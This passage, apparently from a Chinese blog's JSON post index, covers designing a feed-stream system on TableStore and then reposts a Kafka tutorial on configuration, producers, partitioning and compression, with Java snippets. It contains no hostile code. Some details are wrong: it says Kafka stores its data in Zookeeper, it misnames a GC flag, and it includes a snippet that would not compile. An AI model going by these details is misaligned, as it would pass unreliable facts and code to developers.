最终，每个用户可能会有多个特征，那么就可能虚拟关注多个广告账号。 上面是定向广告的一种比较简单的实现方式，其他方式就不再赘述了。 收益上面我们详细说了使用TableStore作为存储和推送系统的架构，接下来我们看看新架构能给我们带来多大收益。 只使用1种系统，架构、实现简单。不再需要访问多个系统，架构，开发，测试，运维都能节省大力人力时间。 TableStore 主键自增列功能性能极优。由于架构的不同，不仅不需要表锁，行锁也不需要，所以性能要远远好于关系型数据库。 可以保存所有的Feed。一是系统可以支持存储所有Feed，二是价格便宜，存的起。 无须将Feed ID和内容分开存储。价格便宜，也就不需要再分开存储ID和内容了。 全托管服务，无运维操作，更无需分库分表。 磁盘型(SSD、Hybrid)数据库，成本低。 可靠性10个9，数据更可靠，更不易丢失。 大V和普通用户的切分阈值更高，读取大V的次数更少，整体延时更低。 一个设计缺陷如果使用大V/普通用户的切分方式，大V使用拉模式，普通用户使用推模式，那么这种架构就会存在一种很大的风险。比如某个大V突然发了一个很有话题性的Feed，那么就有可能导致整个Feed产品中的所有用户都没法读取新内容了，原因是这样的： 大V发送Feed消息。 大V，使用拉模式。 大V的活跃粉丝（用户群A）开始通过拉模式（架构图中读取的步骤3，简称读3）读取大V的新Feed。 Feed内容太有话题性了，快速传播。 未登录的大V粉丝（用户群B）开始登陆产品，登陆进去后自动刷新，再次通过读3步骤读取大V的Feed内容。 非粉丝（用户群C）去大V的个人页Timeline里面去围观，再次需要读取大V个人的Timeline，同读3. 结果就是，平时正常流量只有用户群A，结果现在却是用户群A + 用户群B+ 用户群C，流量增加了好几倍，甚至几十倍，导致读3路径的服务模块被打到server busy或者机器资源被打满，导致读取大V的读3路径无法返回请求，如果Feed产品中的用户都有关注大V，那么基本上所有用户都会卡死在读取大V的读3路径上，然后就没法刷新了。 所以这里设计的时候就需要重点关心下面两点： 单个模块的不可用，不应该阻止整个关键的读Feed流路径，如果大V的无法读取，但是普通用户的要能返回，等服务恢复后，再补齐大V的内容即可。 当模块无法承受这么大流量的时候，模块不应该完全不可服务，而应该能继续提供最大的服务能力，超过的拒绝掉。 那么如何优化呢？ 不使用大V/普通用户的优化方式，使用活跃用户/非活跃用户的优化方式。这样的话，就能把用户群A和部分用户群B分流到其他更分散的多个路径上去。而且，就算读3路径不可用，仍然对活跃用户无任何影响。 完全使用推模式就可以彻底解决这个问题，但是会带来存储量增大，大V微博发送总时间增大，从发给第一个粉丝到发给最后一个粉丝可能要几分钟时间（一亿粉丝，100万行每秒，需要100秒），还要为最大并发预留好资源，如果使用表格存储，因为是云服务，则不需要考虑预留最大额度资源的问题。 实践接下来我们来实现一个消息广场的功能。很多App中都有动态或消息广场的功能，在消息广场中一般有两个Tab，一个是关注人，一个是广场，我们这里重点来看关注人。 要实现的功能如下： 用户之间可以相互关注 用户可以发布新消息 用户可以查看自己发布的消息列表 用户可以查看自己关注的人的消息 采取前面的方案： 使用TableStore作为存储和推送系统 采用Timeline的显示方式，希望用户可以认真看每条Feed 采用推模式 角色接着，我们看看角色和每个角色需要的功能： 发送者 发送状态：add_activity() 接收者 关注：follow() 读取Feed流：get_activity() Feed消息中至少需要包括下面内容： 消息： 发送人：actor 类型：verb，比如图片，视频，文本 文本文字：message 架构图 发布新消息 接口：add_activity() 实现： get_range接口调用关注列表，返回粉丝列表。 batch_write_row接口将feed内容和ID批量写入个人页表（发件箱）和所有粉丝的关注页表（收件箱），如果量太大，可以多次写入。或者调用异步batch_write_row接口，目前C++ SDK和JAVA SDK提供异步接口。 关注 接口：follow() 实现： put_row接口直接写入一行数据(关注人，粉丝)到关注列表和粉丝列表（粉丝，关注人）即可。 获取Feed流消息 接口：get_activity() 实现： 从客户端获取上次读取到的最新消息的ID：last_id 使用get_range接口读取最新的消息，起始位置是last_id，结束位置是MAX。 如果是读取个人页的内容，访问个人页表即可。如果是读取关注页的内容，访问关注页表即可。 计划上面展示了如何使用表格存储TableStore的API来实现。这个虽然只用到几个接口，但是仍然需要学习表格存储的API和特性，还是有点费时间。 为了更加易用性，我们接下来会提供Feeds流完整解决方案，提供一个LIB，接口直接是add_activity()，follow()和get_activity()类似的接口，使用上会更加简单和快捷。 扩展前面讲述的都是Timeline类型的Feed流类型，但是还有一种Feed流类型比较常见，那就是新闻推荐，图片分享网站常用的Rank类型。我们再来回顾下Rank类型擅长的领域： 潜在Feed内容非常多，用户无法全部看完，也不需要全部看完，那么需要为用户选出她最想看的内容，典型的就是图片分享网站，新闻推荐网站等。 我们先来看一种架构图： 这种Rank方式比较轻量级，适用于推拉结合的场景。 写流程基本一样 读流程里面会先读取所有的Feed内容，这个和Timeline也一样，Timeline里面的话，这里会直接返回给用户，但是Rank类型需要在一个排序模块里面，按照某个属性值排序，然后将所有结果存入一个timeline cache中，并返回分数最高的N个结果，下次读取的时候再返回[N+1, 2N]的结果。 再来看另外一种： 这种比较重量级，适用于纯推模式。 写流程也和Timeline一样。 每个用户有两个收件箱： 一个是关注页Timeline，保存原始的Feed内容，用户无法直接查看这个收件箱。 一个是rank timeline，保存为用户精选的Feed内容，用户直接查看这个收件箱。 写流程结束后还有一个数据处理的流程。个性化排序系统从原始Feed收件箱中获取到新的Feed 内容，按照用户的特征，Feed的特征计算出一个分数，每个Feed在不同用户的Timeline中可能分数不一样的，计算完成后再排序然后写入最终的rank timeline。 这种方式可以真正为每个用户做到“千人千面”。 上述两种方式是实现Rank的比较简单，常用的方式。 最后从上面的内容来看，表格存储(TableStore)在存储方面可以支持10PB级，推送方面可以支撑每秒千万的TPS/QPS，在Feed流系统中可以发挥很大的价值。 目前，已经有不少著名公司在使用表格存储(TableStore)来构建他们自己的Feed流系统，最终为系统，产品，公司都带来了不少收益。","categories":[{"name":"架构","slug":"架构","permalink":"https://gschaos.club/categories/%E6%9E%B6%E6%9E%84/"}],"tags":[{"name":"架构","slug":"架构","permalink":"https://gschaos.club/tags/%E6%9E%B6%E6%9E%84/"}]},{"title":"Kafka","slug":"Kafka","date":"2020-11-01T16:00:00.000Z","updated":"2020-11-03T00:41:36.000Z","comments":true,"path":"Kafka/","link":"","permalink":"https://gschaos.club/Kafka/","excerpt":"","text":"Kafka 是由 Linkedin 公司开发的，它是一个分布式的，支持多分区、多副本，基于 Zookeeper 的分布式消息流平台，它同时也是一款开源的基于发布订阅模式的消息引擎系统。 [TOC] 作者： 程序员cxuan 链接： https://juejin.im/post/6844903495670169607 初识 Kafka什么是 KafkaKafka 是由 Linkedin 公司开发的，它是一个分布式的，支持多分区、多副本，基于 Zookeeper 的分布式消息流平台，它同时也是一款开源的基于发布订阅模式的消息引擎系统。 Kafka 的基本术语消息：Kafka 中的数据单元被称为消息，也被称为记录，可以把它看作数据库表中某一行的记录。 批次：为了提高效率， 消息会分批次写入 Kafka，批次就代指的是一组消息。 主题：消息的种类称为 主题（Topic）,可以说一个主题代表了一类消息。相当于是对消息进行分类。主题就像是数据库中的表。 分区：主题可以被分为若干个分区（partition），同一个主题中的分区可以不在一个机器上，有可能会部署在多个机器上，由此来实现 kafka 的伸缩性，单一主题中的分区有序，但是无法保证主题中所有的分区有序 生产者： 向主题发布消息的客户端应用程序称为生产者（Producer），生产者用于持续不断的向某个主题发送消息。 消费者：订阅主题消息的客户端程序称为消费者（Consumer），消费者用于处理生产者产生的消息。 消费者群组：生产者与消费者的关系就如同餐厅中的厨师和顾客之间的关系一样，一个厨师对应多个顾客，也就是一个生产者对应多个消费者，消费者群组（Consumer Group）指的就是由一个或多个消费者组成的群体。 偏移量：偏移量（Consumer Offset）是一种元数据，它是一个不断递增的整数值，用来记录消费者发生重平衡时的位置，以便用来恢复数据。 broker: 一个独立的 Kafka 服务器就被称为 broker，broker 接收来自生产者的消息，为消息设置偏移量，并提交消息到磁盘保存。 broker 集群：broker 是集群 的组成部分，broker 集群由一个或多个 broker 组成，每个集群都有一个 broker 同时充当了集群控制器的角色（自动从集群的活跃成员中选举出来）。 副本：Kafka 中消息的备份又叫做 副本（Replica），副本的数量是可以配置的，Kafka 定义了两类副本：领导者副本（Leader Replica） 和 追随者副本（Follower Replica），前者对外提供服务，后者只是被动跟随。 重平衡：Rebalance。消费者组内某个消费者实例挂掉后，其他消费者实例自动重新分配订阅主题分区的过程。Rebalance 是 Kafka 消费者端实现高可用的重要手段。 Kafka 的特性（设计原则） 高吞吐、低延迟：kakfa 最大的特点就是收发消息非常快，kafka 每秒可以处理几十万条消息，它的最低延迟只有几毫秒。 高伸缩性： 每个主题(topic) 包含多个分区(partition)，主题中的分区可以分布在不同的主机(broker)中。 持久性、可靠性： Kafka 能够允许数据的持久化存储，消息被持久化到磁盘，并支持数据备份防止数据丢失，Kafka 底层的数据存储是基于 Zookeeper 存储的，Zookeeper 我们知道它的数据能够持久存储。 容错性： 允许集群中的节点失败，某个节点宕机，Kafka 集群能够正常工作 高并发： 支持数千个客户端同时读写 Kafka 的使用场景 活动跟踪：Kafka 可以用来跟踪用户行为，比如我们经常回去淘宝购物，你打开淘宝的那一刻，你的登陆信息，登陆次数都会作为消息传输到 Kafka ，当你浏览购物的时候，你的浏览信息，你的搜索指数，你的购物爱好都会作为一个个消息传递给 Kafka ，这样就可以生成报告，可以做智能推荐，购买喜好等。 传递消息：Kafka 另外一个基本用途是传递消息，应用程序向用户发送通知就是通过传递消息来实现的，这些应用组件可以生成消息，而不需要关心消息的格式，也不需要关心消息是如何发送的。 度量指标：Kafka也经常用来记录运营监控数据。包括收集各种分布式应用的数据，生产各种操作的集中反馈，比如报警和报告。 日志记录：Kafka 的基本概念来源于提交日志，比如我们可以把数据库的更新发送到 Kafka 上，用来记录数据库的更新时间，通过kafka以统一接口服务的方式开放给各种consumer，例如hadoop、Hbase、Solr等。 流式处理：流式处理是有一个能够提供多种应用程序的领域。 限流削峰：Kafka 多用于互联网领域某一时刻请求特别多的情况下，可以把请求写入Kafka 中，避免直接请求后端程序导致服务崩溃。 Kafka 的消息队列Kafka 的消息队列一般分为两种模式：点对点模式和发布订阅模式 Kafka 是支持消费者群组的，也就是说 Kafka 中会有一个或者多个消费者，如果一个生产者生产的消息由一个消费者进行消费的话，那么这种模式就是点对点模式 如果一个生产者或者多个生产者产生的消息能够被多个消费者同时消费的情况，这样的消息队列成为发布订阅模式的消息队列 Kafka 系统架构 如上图所示，一个典型的 Kafka 集群中包含若干Producer（可以是web前端产生的Page View，或者是服务器日志，系统CPU、Memory等），若干broker（Kafka支持水平扩展，一般broker数量越多，集群吞吐率越高），若干Consumer Group，以及一个Zookeeper集群。Kafka通过Zookeeper管理集群配置，选举leader，以及在Consumer Group发生变化时进行rebalance。Producer使用push模式将消息发布到broker，Consumer使用pull模式从broker订阅并消费消息。 核心 APIKafka 有四个核心API，它们分别是 Producer API，它允许应用程序向一个或多个 topics 上发送消息记录 Consumer API，允许应用程序订阅一个或多个 topics 并处理为其生成的记录流 Streams API，它允许应用程序作为流处理器，从一个或多个主题中消费输入流并为其生成输出流，有效的将输入流转换为输出流。 Connector API，它允许构建和运行将 Kafka 主题连接到现有应用程序或数据系统的可用生产者和消费者。例如，关系数据库的连接器可能会捕获对表的所有更改 Kafka 为何如此之快Kafka 实现了零拷贝原理来快速移动数据，避免了内核之间的切换。Kafka 可以将数据记录分批发送，从生产者到文件系统（Kafka 主题日志）到消费者，可以端到端的查看这些批次的数据。 批处理能够进行更有效的数据压缩并减少 I/O 延迟，Kafka 采取顺序写入磁盘的方式，避免了随机磁盘寻址的浪费，更多关于磁盘寻址的了解，请参阅 程序员需要了解的硬核知识之磁盘 。 总结一下其实就是四个要点 顺序读写 零拷贝 消息压缩 分批发送 Kafka 安装和重要配置kafka安装自行百度，比较简单，不过有一点配置需要注意以下： kafka安装配置注意点 那我们还是主要来说一下 Kafka 中的重要参数配置吧，这些参数对 Kafka 来说是非常重要的。 broker 端配置 broker.id 每个 kafka broker 都有一个唯一的标识来表示，这个唯一的标识符即是 broker.id，它的默认值是 0。这个值在 kafka 集群中必须是唯一的，这个值可以任意设定， port 如果使用配置样本来启动 kafka，它会监听 9092 端口。修改 port 配置参数可以把它设置成任意的端口。要注意，如果使用 1024 以下的端口，需要使用 root 权限启动 kakfa。 zookeeper.connect 用于保存 broker 元数据的 Zookeeper 地址是通过 zookeeper.connect 来指定的。比如我可以这么指定 localhost:2181 表示这个 Zookeeper 是运行在本地 2181 端口上的。我们也可以通过 比如我们可以通过 zk1:2181,zk2:2181,zk3:2181 来指定 zookeeper.connect 的多个参数值。该配置参数是用冒号分割的一组 hostname:port/path 列表，其含义如下 hostname 是 Zookeeper 服务器的机器名或者 ip 地址。 port 是 Zookeeper 客户端的端口号 /path 是可选择的 Zookeeper 路径，Kafka 路径是使用了 chroot 环境，如果不指定默认使用跟路径。 如果你有两套 Kafka 集群，假设分别叫它们 kafka1 和 kafka2，那么两套集群的zookeeper.connect参数可以这样指定：zk1:2181,zk2:2181,zk3:2181/kafka1和zk1:2181,zk2:2181,zk3:2181/kafka2 log.dirs Kafka 把所有的消息都保存到磁盘上，存放这些日志片段的目录是通过 log.dirs 来制定的，它是用一组逗号来分割的本地系统路径，log.dirs 是没有默认值的，你必须手动指定他的默认值。其实还有一个参数是 log.dir，如你所知，这个配置是没有 s 的，默认情况下只用配置 log.dirs 就好了，比如你可以通过 /home/kafka1,/home/kafka2,/home/kafka3 这样来配置这个参数的值。 num.recovery.threads.per.data.dir 对于如下3种情况，Kafka 会使用可配置的线程池来处理日志片段。 服务器正常启动，用于打开每个分区的日志片段； 服务器崩溃后重启，用于检查和截断每个分区的日志片段； 服务器正常关闭，用于关闭日志片段。 默认情况下，每个日志目录只使用一个线程。因为这些线程只是在服务器启动和关闭时会用到，所以完全可以设置大量的线程来达到井行操作的目的。特别是对于包含大量分区的服务器来说，一旦发生崩愤，在进行恢复时使用井行操作可能会省下数小时的时间。设置此参数时需要注意，所配置的数字对应的是 log.dirs 指定的单个日志目录。也就是说，如果 num.recovery.threads.per.data.dir 被设为 8，并且 log.dir 指定了 3 个路径，那么总共需要 24 个线程。 auto.create.topics.enable 默认情况下，kafka 会使用三种方式来自动创建主题，下面是三种情况： 当一个生产者开始往主题写入消息时 当一个消费者开始从主题读取消息时 当任意一个客户端向主题发送元数据请求时 auto.create.topics.enable参数我建议最好设置成 false，即不允许自动创建 Topic。在我们的线上环境里面有很多名字稀奇古怪的 Topic，我想大概都是因为该参数被设置成了 true 的缘故。 主题默认配置Kafka 为新创建的主题提供了很多默认配置参数，下面就来一起认识一下这些参数 num.partitions num.partitions 参数指定了新创建的主题需要包含多少个分区。如果启用了主题自动创建功能（该功能是默认启用的），主题分区的个数就是该参数指定的值。该参数的默认值是 1。要注意，我们可以增加主题分区的个数，但不能减少分区的个数。 default.replication.factor 这个参数比较简单，它表示 kafka保存消息的副本数，如果一个副本失效了，另一个还可以继续提供服务default.replication.factor 的默认值为1，这个参数在你启用了主题自动创建功能后有效。 log.retention.ms Kafka 通常根据时间来决定数据可以保留多久。默认使用 log.retention.hours 参数来配置时间，默认是 168 个小时，也就是一周。除此之外，还有两个参数 log.retention.minutes 和 log.retentiion.ms 。这三个参数作用是一样的，都是决定消息多久以后被删除，推荐使用 log.retention.ms。 log.retention.bytes 另一种保留消息的方式是判断消息是否过期。它的值通过参数 log.retention.bytes 来指定，作用在每一个分区上。也就是说，如果有一个包含 8 个分区的主题，并且 log.retention.bytes 被设置为 1GB，那么这个主题最多可以保留 8GB 数据。所以，当主题的分区个数增加时，整个主题可以保留的数据也随之增加。 log.segment.bytes 上述的日志都是作用在日志片段上，而不是作用在单个消息上。当消息到达 broker 时，它们被追加到分区的当前日志片段上，当日志片段大小到达 log.segment.bytes 指定上限（默认为 1GB）时，当前日志片段就会被关闭，一个新的日志片段被打开。如果一个日志片段被关闭，就开始等待过期。这个参数的值越小，就越会频繁的关闭和分配新文件，从而降低磁盘写入的整体效率。 log.segment.ms 上面提到日志片段经关闭后需等待过期，那么 log.segment.ms 这个参数就是指定日志多长时间被关闭的参数和，log.segment.ms 和 log.retention.bytes 也不存在互斥问题。日志片段会在大小或时间到达上限时被关闭，就看哪个条件先得到满足。 message.max.bytes broker 通过设置 message.max.bytes 参数来限制单个消息的大小，默认是 1000 000， 也就是 1MB，如果生产者尝试发送的消息超过这个大小，不仅消息不会被接收，还会收到 broker 返回的错误消息。跟其他与字节相关的配置参数一样，该参数指的是压缩后的消息大小，也就是说，只要压缩后的消息小于 mesage.max.bytes，那么消息的实际大小可以大于这个值 这个值对性能有显著的影响。值越大，那么负责处理网络连接和请求的线程就需要花越多的时间来处理这些请求。它还会增加磁盘写入块的大小，从而影响 IO 吞吐量。 retention.ms 规定了该主题消息被保存的时常，默认是7天，即该主题只能保存7天的消息，一旦设置了这个值，它会覆盖掉 Broker 端的全局参数值。 retention.bytes retention.bytes：规定了要为该 Topic 预留多大的磁盘空间。和全局参数作用相似，这个值通常在多租户的 Kafka 集群中会有用武之地。当前默认值是 -1，表示可以无限使用磁盘空间。 JVM 参数配置JDK 版本一般推荐直接使用 JDK1.8，这个版本也是现在中国大部分程序员的首选版本。 说到 JVM 端设置，就绕不开堆这个话题，业界最推崇的一种设置方式就是直接将 JVM 堆大小设置为 6GB，这样会避免很多 Bug 出现。 JVM 端配置的另一个重要参数就是垃圾回收器的设置，也就是平时常说的 GC 设置。如果你依然在使用 Java 7，那么可以根据以下法则选择合适的垃圾回收器： 如果 Broker 所在机器的 CPU 资源非常充裕，建议使用 CMS 收集器。启用方法是指定-XX:+UseCurrentMarkSweepGC。 否则，使用吞吐量收集器。开启方法是指定-XX:+UseParallelGC。 当然了，如果你已经在使用 Java 8 了，那么就用默认的 G1 收集器就好了。在没有任何调优的情况下，G1 表现得要比 CMS 出色，主要体现在更少的 Full GC，需要调整的参数更少等，所以使用 G1 就好了。 一般 G1 的调整只需要这两个参数即可 MaxGCPauseMillis 该参数指定每次垃圾回收默认的停顿时间。该值不是固定的，G1可以根据需要使用更长的时间。它的默认值是 200ms，也就是说，每一轮垃圾回收大概需要200 ms 的时间。 InitiatingHeapOccupancyPercent 该参数指定了 G1 启动新一轮垃圾回收之前可以使用的堆内存百分比，默认值是45，这就表明G1在堆使用率到达45之前不会启用垃圾回收。这个百分比包括新生代和老年代。 Kafka Producer在 Kafka 中，我们把产生消息的那一方称为生产者，比如我们经常回去淘宝购物，你打开淘宝的那一刻，你的登陆信息，登陆次数都会作为消息传输到 Kafka 后台，当你浏览购物的时候，你的浏览信息，你的搜索指数，你的购物爱好都会作为一个个消息传递给 Kafka 后台，然后淘宝会根据你的爱好做智能推荐，致使你的钱包从来都禁不住诱惑，那么这些生产者产生的消息是怎么传到 Kafka 应用程序的呢？发送过程是怎么样的呢？ 尽管消息的产生非常简单，但是消息的发送过程还是比较复杂的，如图 我们从创建一个ProducerRecord 对象开始，ProducerRecord 是 Kafka 中的一个核心类，它代表了一组 Kafka 需要发送的 key/value 键值对，它由记录要发送到的主题名称（Topic Name），可选的分区号（Partition Number）以及可选的键值对构成。 在发送 ProducerRecord 时，我们需要将键值对对象由序列化器转换为字节数组，这样它们才能够在网络上传输。然后消息到达了分区器。 如果发送过程中指定了有效的分区号，那么在发送记录时将使用该分区。如果发送过程中未指定分区，则将使用key 的 hash 函数映射指定一个分区。如果发送的过程中既没有分区号也没有，则将以循环的方式分配一个分区。选好分区后，生产者就知道向哪个主题和分区发送数据了。 ProducerRecord 还有关联的时间戳，如果用户没有提供时间戳，那么生产者将会在记录中使用当前的时间作为时间戳。Kafka 最终使用的时间戳取决于 topic 主题配置的时间戳类型。 如果将主题配置为使用 CreateTime，则生产者记录中的时间戳将由 broker 使用。 如果将主题配置为使用LogAppendTime，则生产者记录中的时间戳在将消息添加到其日志中时，将由 broker 重写。 然后，这条消息被存放在一个记录批次里，这个批次里的所有消息会被发送到相同的主题和分区上。由一个独立的线程负责把它们发到 Kafka Broker 上。 Kafka Broker 在收到消息时会返回一个响应，如果写入成功，会返回一个 RecordMetaData 对象，它包含了主题和分区信息，以及记录在分区里的偏移量，上面两种的时间戳类型也会返回给用户。如果写入失败，会返回一个错误。生产者在收到错误之后会尝试重新发送消息，几次之后如果还是失败的话，就返回错误消息。 创建 Kafka 生产者要向 Kafka 写入消息，首先需要创建一个生产者对象，并设置一些属性。Kafka 生产者有3个必选的属性 bootstrap.servers 该属性指定 broker 的地址清单，地址的格式为 host:port。清单里不需要包含所有的 broker 地址，生产者会从给定的 broker 里查找到其他的 broker 信息。不过建议至少要提供两个 broker 信息，一旦其中一个宕机，生产者仍然能够连接到集群上。 key.serializer broker 需要接收到序列化之后的 key/value值，所以生产者发送的消息需要经过序列化之后才传递给 Kafka Broker。生产者需要知道采用何种方式把 Java 对象转换为字节数组。key.serializer 必须被设置为一个实现了org.apache.kafka.common.serialization.Serializer 接口的类，生产者会使用这个类把键对象序列化为字节数组。这里拓展一下 Serializer 类 Serializer 是一个接口，它表示类将会采用何种方式序列化，它的作用是把对象转换为字节，实现了 Serializer 接口的类主要有 ByteArraySerializer、StringSerializer、IntegerSerializer ，其中 ByteArraySerialize 是 Kafka 默认使用的序列化器，其他的序列化器还有很多，你可以通过 这里 查看其他序列化器。要注意的一点：key.serializer 是必须要设置的，即使你打算只发送值的内容。 value.serializer 与 key.serializer 一样，value.serializer 指定的类会将值序列化。 下面代码演示了如何创建一个 Kafka 生产者，这里只指定了必要的属性，其他使用默认的配置 123456private Properties properties &#x3D; new Properties();properties.put(&quot;bootstrap.servers&quot;,&quot;broker1:9092,broker2:9092&quot;);properties.put(&quot;key.serializer&quot;,&quot;org.apache.kafka.common.serialization.StringSerializer&quot;);properties.put(&quot;value.serializer&quot;,&quot;org.apache.kafka.common.serialization.StringSerializer&quot;);properties &#x3D; new KafkaProducer&lt;String,String&gt;(properties);复制代码 来解释一下这段代码 首先创建了一个 Properties 对象 使用 StringSerializer 序列化器序列化 key / value 键值对 在这里我们创建了一个新的生产者对象，并为键值设置了恰当的类型，然后把 Properties 对象传递给他。 Kafka 消息发送实例化生产者对象后，接下来就可以开始发送消息了，发送消息主要由下面几种方式 简单消息发送Kafka 最简单的消息发送如下： 12345ProducerRecord&lt;String,String&gt; record &#x3D; new ProducerRecord&lt;String, String&gt;(&quot;CustomerCountry&quot;,&quot;West&quot;,&quot;France&quot;);producer.send(record);复制代码 代码中生产者(producer)的 send() 方法需要把 ProducerRecord 的对象作为参数进行发送，ProducerRecord 有很多构造函数，这个我们下面讨论，这里调用的是 12public ProducerRecord(String topic, K key, V value) &#123;&#125;复制代码 这个构造函数，需要传递的是 topic主题，key 和 value。 把对应的参数传递完成后，生产者调用 send() 方法发送消息（ProducerRecord对象）。我们可以从生产者的架构图中看出，消息是先被写入分区中的缓冲区中，然后分批次发送给 Kafka Broker。 发送成功后，send() 方法会返回一个 Future(java.util.concurrent) 对象，Future 对象的类型是 RecordMetadata 类型，我们上面这段代码没有考虑返回值，所以没有生成对应的 Future 对象，所以没有办法知道消息是否发送成功。如果不是很重要的信息或者对结果不会产生影响的信息，可以使用这种方式进行发送。 我们可以忽略发送消息时可能发生的错误或者在服务器端可能发生的错误，但在消息发送之前，生产者还可能发生其他的异常。这些异常有可能是 SerializationException(序列化失败)，BufferedExhaustedException 或 TimeoutException(说明缓冲区已满)，又或是 InterruptedException(说明发送线程被中断) 同步发送消息第二种消息发送机制如下所示 12345678910ProducerRecord&lt;String,String&gt; record &#x3D; new ProducerRecord&lt;String, String&gt;(&quot;CustomerCountry&quot;,&quot;West&quot;,&quot;France&quot;);try&#123; RecordMetadata recordMetadata &#x3D; producer.send(record).get();&#125;catch(Exception e)&#123; e.printStackTrace()；&#125;复制代码 这种发送消息的方式较上面的发送方式有了改进，首先调用 send() 方法，然后再调用 get() 方法等待 Kafka 响应。如果服务器返回错误，get() 方法会抛出异常，如果没有发生错误，我们会得到 RecordMetadata 对象，可以用它来查看消息记录。 生产者（KafkaProducer）在发送的过程中会出现两类错误：其中一类是重试错误，这类错误可以通过重发消息来解决。比如连接的错误，可以通过再次建立连接来解决；无主错误则可以通过重新为分区选举首领来解决。KafkaProducer 被配置为自动重试，如果多次重试后仍无法解决问题，则会抛出重试异常。另一类错误是无法通过重试来解决的，比如消息过大对于这类错误，KafkaProducer 不会进行重试，直接抛出异常。 异步发送消息同步发送消息都有个问题，那就是同一时间只能有一个消息在发送，这会造成许多消息无法直接发送，造成消息滞后，无法发挥效益最大化。 比如消息在应用程序和 Kafka 集群之间一个来回需要 10ms。如果发送完每个消息后都等待响应的话，那么发送100个消息需要 1 秒，但是如果是异步方式的话，发送 100 条消息所需要的时间就会少很多很多。大多数时候，虽然Kafka 会返回 RecordMetadata 消息，但是我们并不需要等待响应。 为了在异步发送消息的同时能够对异常情况进行处理，生产者提供了回掉支持。下面是回调的一个例子 12345678910111213ProducerRecord&lt;String, String&gt; producerRecord &#x3D; new ProducerRecord&lt;String, String&gt;(&quot;CustomerCountry&quot;, &quot;Huston&quot;, &quot;America&quot;); producer.send(producerRecord,new DemoProducerCallBack());class DemoProducerCallBack implements Callback &#123; public void onCompletion(RecordMetadata metadata, Exception exception) &#123; if(exception !&#x3D; null)&#123; exception.printStackTrace();; &#125; &#125;&#125;复制代码 首先实现回调需要定义一个实现了org.apache.kafka.clients.producer.Callback的类，这个接口只有一个 onCompletion方法。如果 kafka 返回一个错误，onCompletion 方法会抛出一个非空(non null)异常，这里我们只是简单的把它打印出来，如果是生产环境需要更详细的处理，然后在 send() 方法发送的时候传递一个 Callback 回调的对象。 生产者分区机制Kafka 对于数据的读写是以分区为粒度的，分区可以分布在多个主机（Broker）中，这样每个节点能够实现独立的数据写入和读取，并且能够通过增加新的节点来增加 Kafka 集群的吞吐量，通过分区部署在多个 Broker 来实现负载均衡的效果。 上面我们介绍了生产者的发送方式有三种：不管结果如何直接发送、发送并返回结果、发送并回调。由于消息是存在主题（topic）的分区（partition）中的，所以当 Producer 生产者发送产生一条消息发给 topic 的时候，你如何判断这条消息会存在哪个分区中呢？ 这其实就设计到 Kafka 的分区机制了。 分区策略Kafka 的分区策略指的就是将生产者发送到哪个分区的算法。Kafka 为我们提供了默认的分区策略，同时它也支持你自定义分区策略。 如果要自定义分区策略的话，你需要显示配置生产者端的参数 Partitioner.class，我们可以看一下这个类它位于 org.apache.kafka.clients.producer 包下 123456789public interface Partitioner extends Configurable, Closeable &#123; public int partition(String topic, Object key, byte[] keyBytes, Object value, byte[] valueBytes, Cluster cluster); public void close(); default public void onNewBatch(String topic, Cluster cluster, int prevPartition) &#123;&#125;&#125;复制代码 Partitioner 类有三个方法，分别来解释一下 partition(): 这个类有几个参数: topic，表示需要传递的主题；key 表示消息中的键值；keyBytes表示分区中序列化过后的key，byte数组的形式传递；value 表示消息的 value 值；valueBytes 表示分区中序列化后的值数组；cluster表示当前集群的原数据。Kafka 给你这么多信息，就是希望让你能够充分地利用这些信息对消息进行分区，计算出它要被发送到哪个分区中。 close() : 继承了 Closeable 接口能够实现 close() 方法，在分区关闭时调用。 onNewBatch(): 表示通知分区程序用来创建新的批次 其中与分区策略息息相关的就是 partition() 方法了，分区策略有下面这几种 顺序轮询 顺序分配，消息是均匀的分配给每个 partition，即每个分区存储一次消息。就像下面这样 上图表示的就是轮询策略，轮训策略是 Kafka Producer 提供的默认策略，如果你不使用指定的轮训策略的话，Kafka 默认会使用顺序轮训策略的方式。 随机轮询 随机轮询简而言之就是随机的向 partition 中保存消息，如下图所示 实现随机分配的代码只需要两行，如下 123List&lt;PartitionInfo&gt; partitions &#x3D; cluster.partitionsForTopic(topic);return ThreadLocalRandom.current().nextInt(partitions.size());复制代码 先计算出该主题总的分区数，然后随机地返回一个小于它的正整数。 本质上看随机策略也是力求将数据均匀地打散到各个分区，但从实际表现来看，它要逊于轮询策略，所以如果追求数据的均匀分布，还是使用轮询策略比较好。事实上，随机策略是老版本生产者使用的分区策略，在新版本中已经改为轮询了。 按照 key 进行消息保存 这个策略也叫做 key-ordering 策略，Kafka 中每条消息都会有自己的key，一旦消息被定义了 Key，那么你就可以保证同一个 Key 的所有消息都进入到相同的分区里面，由于每个分区下的消息处理都是有顺序的，故这个策略被称为按消息键保序策略，如下图所示 实现这个策略的 partition 方法同样简单，只需要下面两行代码即可： 123List&lt;PartitionInfo&gt; partitions &#x3D; cluster.partitionsForTopic(topic);return Math.abs(key.hashCode()) % partitions.size();复制代码 上面这几种分区策略都是比较基础的策略，除此之外，你还可以自定义分区策略。 生产者压缩机制压缩一词简单来讲就是一种互换思想，它是一种经典的用 CPU 时间去换磁盘空间或者 I/O 传输量的思想，希望以较小的 CPU 开销带来更少的磁盘占用或更少的网络 I/O 传输。如果你还不了解的话我希望你先读完这篇文章 程序员需要了解的硬核知识之压缩算法，然后你就明白压缩是怎么回事了。 Kafka 压缩是什么Kafka 的消息分为两层：消息集合 和 消息。一个消息集合中包含若干条日志项，而日志项才是真正封装消息的地方。Kafka 底层的消息日志由一系列消息集合日志项组成。Kafka 通常不会直接操作具体的一条条消息，它总是在消息集合这个层面上进行写入操作。 在 Kafka 中，压缩会发生在两个地方：Kafka Producer 和 Kafka Consumer，为什么启用压缩？说白了就是消息太大，需要变小一点 来使消息发的更快一些。 Kafka Producer 中使用 compression.type 来开启压缩 1234567891011private Properties properties &#x3D; new Properties();properties.put(&quot;bootstrap.servers&quot;,&quot;192.168.1.9:9092&quot;);properties.put(&quot;key.serializer&quot;,&quot;org.apache.kafka.common.serialization.StringSerializer&quot;);properties.put(&quot;value.serializer&quot;,&quot;org.apache.kafka.common.serialization.StringSerializer&quot;);properties.put(&quot;compression.type&quot;, &quot;gzip&quot;);Producer&lt;String,String&gt; producer &#x3D; new KafkaProducer&lt;String, String&gt;(properties);ProducerRecord&lt;String,String&gt; record &#x3D; new ProducerRecord&lt;String, String&gt;(&quot;CustomerCountry&quot;,&quot;Precision Products&quot;,&quot;France&quot;);复制代码 